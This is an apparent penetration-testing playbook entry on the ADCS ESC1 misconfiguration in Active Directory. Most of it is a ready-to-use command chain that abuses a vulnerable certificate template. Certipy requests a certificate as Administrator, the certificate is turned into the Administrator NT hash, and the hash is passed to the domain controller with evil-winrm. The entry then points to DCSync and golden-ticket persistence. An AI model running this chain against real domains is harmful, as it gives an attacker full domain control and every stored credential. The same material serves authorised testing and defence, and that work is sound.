---
id: adcs-esc1
title: ADCS ESC1 — Enrollee Supplies Subject
stage: privesc
tags: [windows, ad]
summary: Request a certificate as any user (including Administrator) from a template that lets enrollees specify their own Subject Alternative Name — certipy handles the full chain.
leads_to:
  - domain-admin
  - dcsync
---

## Prerequisites

Valid domain credentials. ADCS (Active Directory Certificate Services) present on the network. A certificate template with: (1) Client Authentication EKU, (2) Enrollee Supplies Subject enabled, and (3) low-privilege accounts in Enrollment Rights. certipy installed on attacker.

ESC1 is a template misconfiguration where the CA lets the enrollee specify who the certificate is for. Instead of issuing a cert for your own account, you request one for `Administrator` — the CA signs it, and you use it to get Administrator's NT hash via PKINIT. This goes straight to DA from any domain user, no shell on any machine required.

## Quick Win

> Find vulnerable templates with certipy, then request as Administrator in two commands.

```bash
certipy find -u user@$DOMAIN -p password -dc-ip $DC_IP -vulnerable -stdout
certipy req -u user@$DOMAIN -p password -dc-ip $DC_IP -ca 'CA-NAME' -template 'VulnerableTemplate' -upn Administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

## Enumerate Templates

> Run with `-vulnerable` to flag only exploitable templates — check every time ADCS is present.

```bash
certipy find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -vulnerable -stdout

# With NTLM hash
certipy find -u 'account$@$DOMAIN' -hashes ':$NTLM_HASH' -dc-ip $DC_IP -vulnerable -stdout

# Dump all templates if nothing flagged (check manually)
certipy find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -stdout
```

## ESC1 Conditions (all three must be true)

1. Template has `Client Authentication` EKU
2. `Enrollee Supplies Subject: True` (or `User Specified SAN: Enabled`)
3. Low-privilege accounts in `Enrollment Rights`

## Exploit

> Request cert with Administrator's UPN in the SAN — CA signs it without checking.

```bash
# Standard exploit
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -ca 'CA-NAME' -template 'VulnerableTemplate' -upn Administrator@$DOMAIN

# Windows Server 2022 with KB5014754 (StrongCertificateBindingEnforcement)?
# Must embed target account's Object SID — get it first:
impacket-lookupsid $DOMAIN/user:pass@$DC_IP | grep " 500 "
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -ca 'CA-NAME' -template 'VulnerableTemplate' -upn Administrator@$DOMAIN \
  -sid S-1-5-21-...-500

# Authenticate with the cert → get NT hash
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# Use NT hash
evil-winrm -i $DC_IP -u Administrator -H <NT_HASH>
```

## Leads To

`certipy auth` returns the Administrator NT hash → PTH to DC via evil-winrm → domain-admin. From there: DCSync for all hashes (including krbtgt) → golden-ticket persistence. The CA name appears in `certipy find` output — always present in the PKI LDAP object.
